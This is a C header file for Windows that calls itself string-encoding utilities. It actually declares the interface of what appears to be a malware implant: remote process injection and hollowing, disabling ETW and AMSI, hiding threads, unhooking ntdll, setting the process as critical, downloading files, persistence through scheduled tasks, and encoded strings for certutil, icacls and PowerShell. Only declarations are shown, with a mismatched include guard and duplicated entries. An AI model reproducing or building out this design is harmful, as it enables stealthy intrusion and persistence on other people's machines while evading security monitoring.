/*
 * 
 * String encoding and API resolution utilities.
 */

#ifndef UTIL_H
#define UTIL_H

#include <windows.h>
#include <stdlib.h>

void util_init_apis(void);

LPVOID util_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL util_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
HANDLE util_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
HANDLE util_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
UINT util_WinExec(LPCSTR lpCmdLine, UINT uCmdShow);

/* Utility NT API resolution */
typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG);
typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection_t)(HANDLE, PVOID);

pNtSetInfoProc_t util_get_ntsetinfo(void);
pNtQueryInfoProc_t util_get_ntqueryinfo(void);
pNtUnmapViewOfSection_t util_get_ntunmap(void);

/* Utility system functions */
void util_set_critical(void);
void util_clear_critical(void);
const char* util_check_critical(void);
void util_spawn_remote(void);
void util_spawn_memory(void);
void util_setup_wmi(void);
void util_lock_files(void);
void util_lock_file(const char *filename);
void util_download_file(const char *url, const char *outPath);
void util_ensure_task(const char *exePath, const char *taskName);

void util_disable_etw(void);
void util_disable_amsi(void);
void util_hide_thread(void);
void util_load_remote(void);

void util_reset_ntdll(void);
void util_init_phase(void);
void util_sleep_long(DWORD milliseconds);
void util_disable_etw(void);
void util_disable_amsi(void);

char* util_etweventwrite(void);
char* util_amsiscanbuffer(void);
char* util_amsiinit(void);
char* util_amsidll(void);
char* util_ntsetinfothread(void);

/* Delay and timing utilities */
void util_delay(void);
void util_sleep(int ms);

/* Encoded string accessors */
char* get_str(unsigned char *enc, size_t len);
char* util_ntdll(void);
char* util_unmap(void);
char* util_setinfo(void);
char* util_queryinfo(void);
char* util_sedebug(void);
char* util_icacls(void);
char* util_certutil(void);
char* util_schtasks(void);
char* util_ps(void);
char* util_loadlib(void);
char* util_getproc(void);
char* util_getmod(void);
char* util_enumproc(void);
char* util_getbasename(void);
char* util_winexec(void);

/* Global state */
extern int g_critical_protected;

#endif /* OBF_H */
